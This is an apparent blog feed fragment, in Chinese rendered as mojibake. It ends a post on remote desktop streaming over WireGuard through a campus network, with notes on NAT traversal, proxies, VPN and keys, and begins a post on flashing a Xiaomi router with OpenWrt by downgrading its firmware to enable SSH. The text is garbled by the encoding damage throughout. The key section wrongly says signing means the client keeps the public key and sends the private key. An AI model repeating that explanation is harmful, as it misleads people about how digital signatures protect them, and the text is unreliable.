moonlight</h2><p>å…ˆå±€åŸŸç½‘å†…è·Ÿç”µè„‘ç»‘å®šä¸€ä¸‹ Pin ç ï¼Œè¿œç¨‹çš„æ—¶å€™æ‰“å¼€ WireGuard æŒ‡å®š 192.168.1.6 çš„ ip è¿æ¥ç”µè„‘å³å¯</p><h1 id="æ‚è°ˆ"><a href="#æ‚è°ˆ" class="headerlink" title="æ‚è°ˆ"></a>æ‚è°ˆ</h1><h2 id="æŠ˜è…¾ï¼Ÿ"><a href="#æŠ˜è…¾ï¼Ÿ" class="headerlink" title="æŠ˜è…¾ï¼Ÿ"></a>æŠ˜è…¾ï¼Ÿ</h2><p>æŠ˜è…¾ï¼Œå…¶å®å›¾æ–¹ä¾¿çš„è¯ç›´æ¥ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶å‘æ—¥è‘µæˆ–è€… windows è¿œç¨‹æ¡Œé¢ç­‰å°±èƒ½å®ç°éœ€æ±‚ï¼Œå¦‚æœéè¦ç”¨ moonlight+sunshine çš„è¯åœ¨ openwrt ä¸Šä¹Ÿæœ‰ç°æˆçš„å‚»ç“œå¼ç»„ç½‘å·¥å…· ZeroTier ç­‰ç­‰å¯ä»¥ç”¨ï¼Œæ›´åŠ æ–¹ä¾¿å¯èƒ½æ•ˆæœä¹Ÿå¥½ã€‚é‚£ä¹ˆæˆ‘è¿™ä¹ˆæŠ˜è…¾ä¸»è¦ä¹Ÿå°±æ˜¯ä¸ºäº†å¤šå­¦ä¹ å®è·µï¼Œå†è€… DN11 çš„ä½¬ä»¬ä¹Ÿä½¿ç”¨äº† WireGuard è¿›è¡Œç»„ç½‘ï¼Œé‚£ä¹ˆæˆ‘å°±å½“æ˜¯å¹¶å…¥ DN11 ç½‘ç»œå‰æå‰å°è¯•ä¸€ä¸‹ã€‚</p><h2 id="å†…ç½‘ç©¿é€ã€NATã€ä»£ç†ã€éš§é“ã€VPNã€è™šæ‹Ÿå±€åŸŸç½‘ã€ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘"><a href="#å†…ç½‘ç©¿é€ã€NATã€ä»£ç†ã€éš§é“ã€VPNã€è™šæ‹Ÿå±€åŸŸç½‘ã€ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘" class="headerlink" title="å†…ç½‘ç©¿é€ã€NATã€ä»£ç†ã€éš§é“ã€VPNã€è™šæ‹Ÿå±€åŸŸç½‘ã€ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘"></a>å†…ç½‘ç©¿é€ã€NATã€ä»£ç†ã€éš§é“ã€VPNã€è™šæ‹Ÿå±€åŸŸç½‘ã€ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘</h2><p>è¿™ä¸€å¤§å †æ¦‚å¿µæ›¾ç»æˆ–è®¸æ˜ç™½äº†ï¼Œä½†è¿‡æ®µæ—¶é—´åˆåˆ†ä¸æ¸…äº†â€¦â€¦è¿™é‡Œç®€è¦è®°å½•ä¸€ä¸‹ç°åœ¨çš„ç†è§£ï¼Œä¸ä¿è¯æ­£ç¡®æ€§å’Œå‡†ç¡®æ€§â€¦â€¦</p><h3 id="å†…ç½‘ç©¿é€ä¸-NAT"><a href="#å†…ç½‘ç©¿é€ä¸-NAT" class="headerlink" title="å†…ç½‘ç©¿é€ä¸ NAT"></a>å†…ç½‘ç©¿é€ä¸ NAT</h3><p>å†…ç½‘ç©¿é€å³ NAT ç©¿é€ã€‚</p><p>åœ¨ <strong>NAT</strong> åçš„å¤šå°è®¾å¤‡é€šè¿‡ NAT çš„ç½‘ç»œåœ°å€è½¬æ¢å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå¤–éƒ¨ IP è¿›è¡Œå¯¹å¤–è®¿é—®ã€‚ä»¥æœ¬æ¬¡å°è¯•ä¸ºä¾‹ï¼Œåœ¨å†…éƒ¨è®¾å¤‡ï¼ˆ192.168.1.6ï¼‰å‘é€è¯·æ±‚åï¼Œè¯·æ±‚çš„ IP æ•°æ®åŒ…ä¸ºæº 192.168.1.6 è‡³ç›®æ ‡ 10.150.27.27ï¼ˆè¿™ä¸ªæ˜¯éšä¾¿å†™çš„æ ¡å›­å†…ç½‘ IPï¼Œä½†ç›¸å¯¹äºå¯å®¤å±€åŸŸç½‘æ¥è¯´æ˜¯å¤–ç½‘ï¼Œæ›¿æ¢æˆå…¬ç½‘ IP ä¹Ÿä¸€æ ·ç†è§£ï¼‰ï¼Œé‚£ä¹ˆ NAT å°±ä¼šå°†è¿™ä¸ªæ•°æ®åŒ…çš„æº IP æ”¹å†™ä¸ºæœ¬å±€åŸŸç½‘å¯ç”¨çš„å¤–éƒ¨ IPï¼ˆå‡è®¾è·¯ç”±å™¨åœ¨æ ¡å›­å†…ç½‘ä¸­è¢«åˆ†é…åˆ°çš„ 10.150.27.28ï¼‰ï¼Œå¹¶ç•™ä¸‹ä¸€æ¡å†…éƒ¨ 192.168.1.6 åˆ°å¤–éƒ¨ 10.150.27.28 çš„æ˜ å°„è®°å½•ï¼Œå¤–éƒ¨å¹¶ä¸çŸ¥é“æ˜¯ NAT ä¸‹å…·ä½“æ˜¯å“ªä¸ª IP å‘èµ·çš„è¯·æ±‚ï¼Œå°†å“åº”æ•°æ®åŒ…è¿”å›ç»™è·¯ç”±å™¨åè·¯ç”±å™¨çš„ NAT å°±æ ¹æ®æ˜ å°„è®°å½•å°†å“åº”è½¬å‘ç»™å…¶ä¸‹å±€åŸŸç½‘å†…å‘èµ·è¯·æ±‚çš„ IPã€‚å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ç§æƒ…å†µä¸‹å¤–éƒ¨æƒ³è¦ä¸»åŠ¨è®¿é—®å†…éƒ¨è®¾å¤‡å°±å˜å¾—å›°éš¾äº†ã€‚</p><p>é‚£ä¹ˆ<strong>å†…ç½‘ç©¿é€</strong>è§£å†³çš„å…¶å®å°±æ˜¯è¿™ä¸ªé—®é¢˜ï¼Œé€šè¿‡è®©å†…éƒ¨è®¾å¤‡ä¸»åŠ¨è¯·æ±‚å¤–éƒ¨è®¾å¤‡æ¥è®©è·¯ç”±å™¨ NAT ç•™ä¸‹æ˜ å°„è®°å½•ï¼Œç„¶åå¤–éƒ¨è®¾å¤‡æ‰èƒ½å‘å†…éƒ¨å‘é€æ•°æ®ï¼Œé€šè¿‡å·²ç»å»ºç«‹é€šä¿¡çš„å¤–éƒ¨è®¾å¤‡è¿›è¡Œä¸­è½¬ä¸å†…éƒ¨é€šä¿¡ï¼Œå°±æ˜¯å®ç°äº†å†…ç½‘ç©¿é€ã€‚</p><h3 id="ä»£ç†ä¸å†…ç½‘ç©¿é€"><a href="#ä»£ç†ä¸å†…ç½‘ç©¿é€" class="headerlink" title="ä»£ç†ä¸å†…ç½‘ç©¿é€"></a>ä»£ç†ä¸å†…ç½‘ç©¿é€</h3><p><strong>ä»£ç†</strong>çš„æ¦‚å¿µæœ€æµ…æ˜¾æ˜“æ‡‚ï¼Œå°±æ˜¯è®©ä¸€ä¸ªä¸­é—´äººï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰ä»£ä¸ºä¼ é€’æ¶ˆæ¯ï¼Œåˆ†ä¸ºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ä¸¤ç§</p><p>æ­£å‘å¯ä»¥èµ·åˆ°éšè—è®¿é—®è€… IPã€è®¿é—®éƒ¨åˆ†ä¸å¯è¾¾å¤–éƒ¨ç½‘ç»œï¼ˆæ›´å‡†ç¡®é€šç”¨åœ°è¯´åº”è¯¥æ˜¯ç»•è¿‡è®¿é—®é™åˆ¶ï¼‰ç­‰ä½œç”¨ã€‚</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/HgiTbMkwaoHyRax0x6WcNcrHnNg.png"></p><p>åå‘ä»£ç†åˆ™å¯ç”¨äºè®¿é—®æ§åˆ¶ã€CDN åŠ é€Ÿã€è´Ÿè½½å‡è¡¡ç¼“å­˜ä¼˜åŒ–ã€è®¿é—®éƒ¨åˆ†ä¸å¯è¾¾å†…éƒ¨ç½‘ç»œï¼ˆæ›´å‡†ç¡®é€šç”¨åœ°è¯´åº”è¯¥æ˜¯ç»•è¿‡è®¿é—®é™åˆ¶ï¼‰ç­‰ç­‰</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/UQ5gbwAf3oJvysx9kxeceQrxnDg.png"></p><p>é‚£ä¹ˆå†…ç½‘ç©¿é€ä¸ä»£ç†æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿæˆ‘è§‰å¾—<strong>å†…ç½‘ç©¿é€</strong>çš„æ ¸å¿ƒå°±æ˜¯é€šè¿‡å†…éƒ¨è®¾å¤‡ä¸»åŠ¨å‘å‡ºè¯·æ±‚ä¿æŒä¸€æ¡ä¸å¤–ç•ŒæŒç»­è¿æ¥é€šä¿¡çš„ä¿¡é“ï¼Œä½†ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œè¿™ä¸ªè®¾å¤‡æœ€å¥½ä½œä¸ºä¸­è½¬çš„ä»£ç†æœåŠ¡å™¨ï¼ˆä¸éœ€è¦è‡ªå·±ç›´æ¥ä½¿ç”¨çš„è®¾å¤‡æ¥ç»´æŒè¿æ¥ï¼‰ä¸”æœ‰å…¬ç½‘ IPï¼ˆéšå¤„å‡å¯è®¿é—®ï¼‰ï¼Œæ‰€ä»¥å°±ä¼šä¸ä»£ç†æŠ€æœ¯è”ç³»åœ¨ä¸€èµ·ï¼Œä»£ç†å¼ºè°ƒçš„æ˜¯æ•´ä½“çš„ç½‘ç»œé€šä¿¡é€»è¾‘ç»“æ„ï¼Œå†…ç½‘ç©¿é€å¼ºè°ƒçš„æ˜¯å¤–éƒ¨è®¾å¤‡è®¿é—®å†…éƒ¨è®¾å¤‡çš„æ–¹å¼ã€‚ä¾‹å¦‚ frp å°±æ˜¯ä½¿ç”¨åå‘ä»£ç†ã€‚</p><h3 id="éš§é“ã€VPN-ä¸ä»£ç†"><a href="#éš§é“ã€VPN-ä¸ä»£ç†" class="headerlink" title="éš§é“ã€VPN ä¸ä»£ç†"></a>éš§é“ã€VPN ä¸ä»£ç†</h3><p><strong>éš§é“</strong>æŠ€æœ¯æ˜¯åœ¨ä¸€ä¸ªç½‘ç»œåè®®ä¸­å°è£…å¦ä¸€ä¸ªç½‘ç»œåè®®çš„æ•°æ®åŒ…ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨åŸæœ¬ä¸æ”¯æŒçš„ç½‘ç»œä¸Šè¿›è¡Œä¼ è¾“ã€‚ï¼ˆåº”ç”¨å±‚ï¼‰</p><p>è€Œ <strong>VPN</strong> åˆ™æ˜¯ä½¿ç”¨äº†éš§é“æŠ€æœ¯å¹¶åŠ å¯†ç”¨äºæ„å»ºç§æœ‰å®‰å…¨é€šä¿¡çš„æŠ€æœ¯ã€‚</p><p>è€Œ<strong>ä»£ç†</strong>å¦‚ä¸Šæ‰€è¯´å¼ºè°ƒçš„æ˜¯ä¸­é—´äººä¸­è½¬çš„é€šä¿¡é€»è¾‘ï¼Œå®ƒçš„å®ç°åˆ™å¯ä»¥ä½¿ç”¨ VPN æŠ€æœ¯ï¼Œå¦‚æœä¸ä½¿ç”¨ VPN ä»…ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ä¸­è½¬é‚£ä¹ˆé€šä¿¡å†…å®¹æ˜¯å¹¶ä¸éšè”½çš„ï¼Œå¦‚æœä½¿ç”¨ VPN è¿›è¡Œä»£ç†é‚£ä¹ˆ VPN çš„åŠ å¯†éš§é“å°±å¯ä»¥ç¡®ä¿ä»å®¢æˆ·ç«¯åˆ°ä»£ç†æœåŠ¡å™¨çš„éšç§˜æ€§ã€‚</p><h3 id="è™šæ‹Ÿå±€åŸŸç½‘ä¸-VPN"><a href="#è™šæ‹Ÿå±€åŸŸç½‘ä¸-VPN" class="headerlink" title="è™šæ‹Ÿå±€åŸŸç½‘ä¸ VPN"></a>è™šæ‹Ÿå±€åŸŸç½‘ä¸ VPN</h3><p><strong>è™šæ‹Ÿå±€åŸŸç½‘</strong>å³ VLANï¼Œæ˜¯åœ¨<u>æ•°æ®é“¾è·¯å±‚ä¸Š</u>å¯¹ä¸€ä¸ª<u>ç‰©ç†ç½‘ç»œ</u>è¿›è¡Œé€»è¾‘åˆ’åˆ†çš„æŠ€æœ¯ï¼Œå®ƒä½¿å¾—åœ¨ç‰©ç†ä¸Šå¤„äºä¸åŒä½ç½®çš„è®¾å¤‡å¯ä»¥è¢«åˆ’å½’åˆ°åŒä¸€ä¸ªé€»è¾‘å±€åŸŸç½‘ä¸­ã€‚ï¼ˆä½†æˆ‘å‘ç°ä¼¼ä¹è¿™ä¸ªä¸¥æ ¼æ¥è®²æ˜¯åœ¨å±€åŸŸç½‘æœ¬èº«ä¸Šå®ç°çš„ï¼Œè€Œéæˆ‘ä¹‹å‰ä»¥ä¸ºçš„é‚£æ ·ï¼Œæ‰€ä»¥å‰é¢å†…å®¹éœ€éƒ¨åˆ†æ›´æ­£ã€‚ï¼‰</p><p>é‚£ä¹ˆè™šæ‹Ÿå±€åŸŸç½‘ä¸æœ¬ç¯‡é€šè¿‡ VPN å®ç°çš„æ•ˆæœæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ<strong>VPN</strong>ï¼šé€šè¿‡åŠ å¯†éš§é“åœ¨å…¬å…±ç½‘ç»œä¸Šè¿æ¥è¿œç¨‹è®¾å¤‡æˆ–ç½‘ç»œï¼Œå½¢æˆä¸€ä¸ª<u>é€»è¾‘ä¸Š</u>çš„â€œç§æœ‰ç½‘ç»œâ€ï¼Œè®¾å¤‡å¯ä»¥è·¨è¶Šä¸åŒç‰©ç†ä½ç½®é€šä¿¡ï¼›<strong>VLAN</strong>ï¼šåœ¨<u>å±€åŸŸç½‘å†…</u>é€šè¿‡<u>äº¤æ¢æœº</u>é…ç½®<u>é€»è¾‘éš”ç¦»</u>çš„<u>å¹¿æ’­åŸŸ</u>ï¼Œç”¨äº<u>åˆ†å‰²æœ¬åœ°ç½‘ç»œæµé‡</u>ï¼Œä¸æ¶‰åŠåŠ å¯†æˆ–è¿œç¨‹è¿æ¥ã€‚</p><h3 id="ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€å’Œä»£ç†"><a href="#ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€å’Œä»£ç†" class="headerlink" title="ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€å’Œä»£ç†"></a>ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘ä¸å†…ç½‘ç©¿é€å’Œä»£ç†</h3><p><strong>ç«¯å£æ˜ å°„ã€ç«¯å£è½¬å‘</strong>å®ç°åŠŸèƒ½ç±»ä¼¼ï¼ŒæŠ€æœ¯æœ¬è´¨ä¸Šä¹Ÿæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œéƒ½æ˜¯é€šè¿‡ NAT è¡¨ï¼Œå°†è·¯ç”±å™¨ä¸ŠæŒ‡å®šç«¯å£çš„æµé‡è½¬å‘åˆ°å†…éƒ¨çš„æŒ‡å®š IP çš„æŒ‡å®šç«¯å£ï¼Œåªæ˜¯è¯´ç«¯å£æ˜ å°„å¼ºè°ƒçš„æ˜¯å°†å†…ç½‘è®¾å¤‡çš„ç«¯å£å…¬å¼€åˆ°è·¯ç”±å™¨æ‰€åœ¨çš„å¤–éƒ¨ç½‘ç»œï¼Œç«¯å£è½¬å‘å¼ºè°ƒçš„æ˜¯å°†å¤–éƒ¨è®¿é—®çš„æ•°æ®è½¬å‘åˆ°å†…éƒ¨è®¾å¤‡ã€‚</p><p>ä¸å†…ç½‘ç©¿é€ä¸åŒçš„æ˜¯è¿™ä¸ªæ˜¯ç›´æ¥åœ¨è·¯ç”±å™¨ä¸Šé…ç½®è§„åˆ™çš„ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥å®ç°å†…ç½‘ç©¿é€çš„æ•ˆæœã€‚</p><p>å¦å¤–å®ƒä»¬å¸®åŠ©ä»£ç†çš„å®ç°ã€‚</p><h3 id="å†…ç½‘ç©¿é€ä¸VPN"><a href="#å†…ç½‘ç©¿é€ä¸VPN" class="headerlink" title="å†…ç½‘ç©¿é€ä¸VPN"></a>å†…ç½‘ç©¿é€ä¸VPN</h3><p>è®²æ¥è®²å»å‰é¢æˆ‘å°è¯•çš„å…¨æ˜¯VPNã€‚è¿™ä¸¤è€…çš„åŒºåˆ«æ„Ÿè§‰å¯ä»¥è¿™æ ·å½¢å®¹ï¼Œå†…ç½‘ç©¿é€æ˜¯æŠŠæŸä¸ªå†…ç½‘è®¾å¤‡æš´éœ²åˆ°å¤–éƒ¨ç½‘ç»œä»¥ä¾›è®¿é—®ï¼ŒVPNæ˜¯æŠŠå¤–éƒ¨è®¾å¤‡å¹¶å…¥å†…éƒ¨ç½‘ç»œï¼Œé€šè¿‡VPNå¤–éƒ¨è®¾å¤‡å¯ä»¥è®¿é—®å†…ç½‘çš„æ‰€æœ‰ç½‘ç»œæœåŠ¡ã€‚</p><h2 id="éå¯¹ç§°å¯†ç ä¸å¯¹ç§°å¯†ç "><a href="#éå¯¹ç§°å¯†ç ä¸å¯¹ç§°å¯†ç " class="headerlink" title="éå¯¹ç§°å¯†ç ä¸å¯¹ç§°å¯†ç "></a>éå¯¹ç§°å¯†ç ä¸å¯¹ç§°å¯†ç </h2><p>é…ç½® WireGuard æ—¶å‡ºç°äº†ä¸¤ç»„å¯†é’¥ï¼Œå®¹æ˜“ææ··ï¼Œå€Ÿæ­¤è®°å½•ä¸€ä¸‹</p><p>å¯¹ç§°å¯†ç çš„ä¼˜åŠ¿åœ¨äºåŠ è§£å¯†ç›¸å¯¹å¿«é€Ÿï¼Œç¡¬ä»¶è¦æ±‚ç›¸å¯¹è¾ƒä½ï¼Œä½†æ— æ³•è§£å†³èº«ä»½è®¤è¯é—®é¢˜ï¼Œå¯†é’¥ä¸èƒ½åœ¨å…¬å¼€ä¿¡é“ä¼ è¾“ã€‚</p><p>è€Œéå¯¹ç§°å¯†ç æŸå¤±äº†ä¸€äº›åŠ è§£å¯†æ•ˆç‡ä½†è§£å†³äº†èº«ä»½è®¤è¯é—®é¢˜ï¼Œç§é’¥æœ¬åœ°ä¿å­˜å…¬é’¥å‘å¤–å‘æ”¾ï¼Œå…¬é’¥åŠ å¯†ç§é’¥è§£å¯†ã€‚</p><p>åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é€šä¿¡çš„åœºæ™¯ä¸­ï¼Œå®¢æˆ·ç«¯ä¿å­˜ç§é’¥å¹¶å°†å…¬é’¥ä¼ è¾“ç»™æœåŠ¡å™¨ï¼Œè¿™æ ·å°±ç¡®ä¿äº†æœåŠ¡å™¨å‘é€çš„æ•°æ®åªæœ‰è¿™ä¸ªå®¢æˆ·ç«¯èƒ½è§£å¯†ï¼Œå³ä¾¿å…¬é’¥è¢«ä»–äººè·å–ã€‚åœ¨æ•°å­—ç­¾åçš„åœºæ™¯ä¸­ï¼Œå°±æ˜¯å®¢æˆ·ç«¯ä¿ç•™å…¬é’¥ï¼Œå‘æœåŠ¡ç«¯å‘é€ç§é’¥ï¼Œé‚£ä¹ˆå°±åªæœ‰è¯¥å®¢æˆ·ç«¯å¯ä»¥æ­£ç¡®åœ°åŠ å¯†å†…å®¹å¹¶ä¼ è¾“ç»™æœåŠ¡å™¨è®¤è¯ã€‚</p><p>é‚£ä¹ˆåœ¨ WireGuard éš§é“ä¸­å°±æ˜¯èŠ‚ç‚¹ A ä¸èŠ‚ç‚¹ B é—´å„è‡ªä¿å­˜è‡ªå·±çš„ç§é’¥å’Œå¯¹æ–¹çš„å…¬é’¥ï¼Œç¡®ä¿ A å‘å‡ºçš„æ•°æ®åªæœ‰ B èƒ½è§£å¯†ï¼ŒB å‘å‡ºçš„æ•°æ®åªæœ‰ A èƒ½è§£å¯†ä»è€Œç¡®ä¿å®‰å…¨æ€§ã€‚</p><h2 id="åˆ©ç”¨-DDNS-çš„æ”¹è¿›"><a href="#åˆ©ç”¨-DDNS-çš„æ”¹è¿›" class="headerlink" title="åˆ©ç”¨ DDNS çš„æ”¹è¿›"></a>åˆ©ç”¨ DDNS çš„æ”¹è¿›</h2><p>å‰é¢çš„å®ç°çš„æ–¹æ¡ˆæœ‰ä¸€ä¸ªä¸å¤ªæ–¹ä¾¿çš„é—®é¢˜ï¼Œå°±æ˜¯ IP æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼ˆæˆ‘å°è¯•è¿‡è®¾ç½®é™æ€ IP ä½†åŸæœ¬çš„ç§Ÿç”¨æœŸæ»¡åå°±æ— æ³•æ­£å¸¸ä¸Šç½‘äº†ï¼Œçœ‹æ¥åªèƒ½æ¥å—å­¦æ ¡çš„ DHCPï¼Œä¸è¿‡ç”Ÿæ´»åŒºæŸæ¬¡æ–­ç½‘åå‘ç°ç§ŸæœŸä»ä¸‰å¤©å˜æˆäº†å…­å¤©ï¼‰ï¼Œéš”æ®µæ—¶é—´å°±è¦æ”¹ä¸€ä¸‹æ‰‹æœºç«¯ä¸Š WireGuard é…ç½®çš„å¯¹ç«¯ IPã€‚äºæ˜¯æˆ‘é‡æ–°è€ƒè™‘ DDNS åˆ°åº•èƒ½ä¸èƒ½ç”¨ï¼ˆä¹‹å‰ä»¥ä¸ºå°±æ˜¯è¦å…¬ç½‘ IP çš„æ¥ç€ï¼‰ï¼Œå‘ç°è‡³å°‘é˜¿é‡Œäº‘çš„åŸŸåè§£ææ˜¯å¯ä»¥è§£ææˆå†…ç½‘ IP çš„ï¼Œåç»­å¦èµ·ä¸€ç¯‡çœ‹çœ‹èƒ½ä¸èƒ½ DDNS å§ã€‚</p><h2 id="åæ¶ˆæ¯"><a href="#åæ¶ˆæ¯" class="headerlink" title="åæ¶ˆæ¯"></a>åæ¶ˆæ¯</h2><p>è¿™ä¸ªæ–¹æ¡ˆå‡ºç°äº†é—®é¢˜ï¼Œä¸²æµæˆåŠŸåè¿‡ä¸€ä¼šåè¿æ¥ä¼šå¼‚å¸¸ä¸­æ–­ï¼Œåç»­å†æ’æŸ¥é—®é¢˜å§ï¼Œå¦èµ·ä¸€ç¯‡ã€‚ç´¯</p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç½‘</tag>
      
      <tag>openwrt</tag>
      
      <tag>WireGuard</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°ç±³ AX3000T åˆ·æœº openwrt å°è®°</title>
    <link href="/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="å°ç±³-AX3000T-åˆ·æœº-openwrt-å°è®°"><a href="#å°ç±³-AX3000T-åˆ·æœº-openwrt-å°è®°" class="headerlink" title="å°ç±³ AX3000T åˆ·æœº openwrt å°è®°"></a>å°ç±³ AX3000T åˆ·æœº openwrt å°è®°</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸¤å¤©åœ¨æ€è€ƒå¦‚ä½•åœ¨å¯å®¤å±€åŸŸç½‘ä¹‹å¤–è¿œç¨‹è¿æ¥å¯å®¤è®¾å¤‡ï¼Œä»¥æ»¡è¶³æˆ‘æœ‰æ—¶å€™å‡ºé—¨ä¸æ–¹ä¾¿å¸¦ç”µè„‘æƒ³è¦ç”¨æ‰‹æœºè¿œç¨‹è¿æ¥ç”µè„‘æ“ä½œçš„éœ€æ±‚ã€‚æˆ‘é€‰å®šçš„æ˜¯ sunshine+moonlight ä¸²æµæ–¹æ¡ˆï¼Œç„¶è€Œè¯¥æ–¹æ¡ˆæœ¬èº«å¹¶ä¸æ”¯æŒè¿œç¨‹è¿æ¥ï¼Œåªé€‚ç”¨äºå±€åŸŸç½‘è¿æ¥ï¼Œæ‰€ä»¥æˆ‘éœ€è¦é€šè¿‡å†…ç½‘ç©¿é€æˆ– VPN æ„å»ºè™šæ‹Ÿå±€åŸŸç½‘æ¥è®©æˆ‘çš„ç”µè„‘å’Œæ‰‹æœºè®¾å¤‡å¤„äºåŒä¸€ä¸ªå±€åŸŸç½‘ç¯å¢ƒå†…ã€‚å…ˆå°è¯•äº†äº‘æœåŠ¡å™¨ä¹‹å‰æ­å»ºå¥½çš„ openVPN æœåŠ¡ï¼Œå‘ç°é™äºå¸¦å®½å’Œæ€§èƒ½ï¼Œè¿æ¥è´¨é‡å¹¶ä¸ç†æƒ³ï¼Œäºæ˜¯æˆ‘æƒ³å°è¯•åœ¨å¯å®¤è·¯ç”±å™¨ä¸Šä½¿ç”¨ wireguard æ„å»ºéš§é“å®ç°å†…ç½‘ç©¿é€ã€‚</p><p>å¥½äº†ï¼Œä¸ç®¡æ€ä¹ˆè¯´ï¼ŒåŸå‚çš„å¯æ“ä½œæ€§å¤ªå·®äº†ï¼Œå…ˆåˆ·ä¸ª openwrt è€è€ 0v0</p><h1 id="è®¾å¤‡å‹å·"><a href="#è®¾å¤‡å‹å·" class="headerlink" title="è®¾å¤‡å‹å·"></a>è®¾å¤‡å‹å·</h1><p>è·¯ç”±å™¨å‹å·ï¼šå°ç±³ AX3000T</p><p>ç³»ç»Ÿ ROM ç‰ˆæœ¬ï¼š1.0.98ï¼Ÿï¼ˆå¥½åƒæ˜¯ 9 å‡ ï¼Œå¿˜äº†ï¼‰</p><h1 id="å®ç°è¿‡ç¨‹"><a href="#å®ç°è¿‡ç¨‹" class="headerlink" title="å®ç°è¿‡ç¨‹"></a>å®ç°è¿‡ç¨‹</h1><h2 id="å¯ç”¨-SSH"><a href="#å¯ç”¨-SSH" class="headerlink" title="å¯ç”¨ SSH"></a>å¯ç”¨ SSH</h2><h3 id="å›ºä»¶é™çº§"><a href="#å›ºä»¶é™çº§" class="headerlink" title="å›ºä»¶é™çº§"></a>å›ºä»¶é™çº§</h3><p>ä¸ºäº†èƒ½å¤Ÿé€šè¿‡ ssh è¿æ¥è·¯ç”±å™¨è®¾å¤‡æ§åˆ¶å¹¶æ“ä½œï¼Œéœ€è¦å…ˆé™ä½ ROM ç‰ˆæœ¬æ¢æˆæ˜“äºæ”»å‡»çš„ 1.0.47 ç‰ˆæœ¬ï¼Œä»è€Œå¯ç”¨ sshã€‚</p><p>1.0.47 å›ºä»¶é“¾æ¥ï¼š<a href="https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd03/miwifi_rd03_firmware_ef0ee_1.0.47.bin">å°ç±³å®˜æ–¹ CDN</a></p><p>å°ç±³å®˜æ–¹åˆ·æœºå·¥å…·ï¼š<a href="https://www1.miwifi.com/miwifi_download.html">https://www1.miwifi.com/miwifi_download.html</a></p><p>ä¸‹è½½ç¼–è¯‘å¥½çš„å›ºä»¶åå…ˆæ‰“å¼€åˆ·æœºå·¥å…·ï¼Œç”¨ç½‘çº¿è¿æ¥ç”µè„‘å’Œè·¯ç”±å™¨ lan å£ï¼Œé€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/JsDKbvdoVomz1bxsbYscOWv4nab.png"></p><p>é€‰æ‹©ç½‘å¡ï¼Œéœ€è¦åŒºåˆ† VMware è®¾å¤‡çš„è™šæ‹Ÿç½‘å¡ç­‰å…¶ä»–ç½‘å¡ï¼Œå¿…è¦çš„æ—¶å€™å¯ä»¥æš‚æ—¶ç¦ç”¨å…¶ä»–ç½‘å¡ï¼Œå¿…é¡»é€‰æ‹©ç‰©ç†ç½‘å¡ï¼Œä¸€èˆ¬åç§°å¸¦æœ‰â€œä»¥å¤ªç½‘â€ã€‚è€Œåç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/MSVEbD2NHoTV7ExS90EcsFZVnpb.png"></p><p>æ ¹æ®æç¤ºå…ˆç»™è·¯ç”±å™¨æ–­ç”µï¼Œæ‰¾ä¸€æ ¹å¡é’ˆæˆ–è€…ç‰™ç­¾æŒ‰ä½è·¯ç”±å™¨ä¸Šçš„ reset é”®ï¼Œç„¶åæ¥é€šç”µæºï¼Œç­‰åˆ°æ©™è‰²ç¯é—ªçƒä¹‹åå†æ¾å¼€ reset é”®ã€‚ä¸€å¼€å§‹ä¸‹æ–¹ä¼šå‡ºç°â€œå¯ä»¥å¼€å§‹åˆ·æœºæ“ä½œâ€çš„æç¤ºï¼Œè·¯ç”±å™¨æ©™è‰²ç¯é—ªçƒï¼Œç„¶åè·¯ç”±å™¨å‘é€è¯·æ±‚ï¼Œç”µè„‘è¿”å›æ–‡ä»¶ï¼Œå·¥å…·è‡ªåŠ¨åˆ·å…¥ 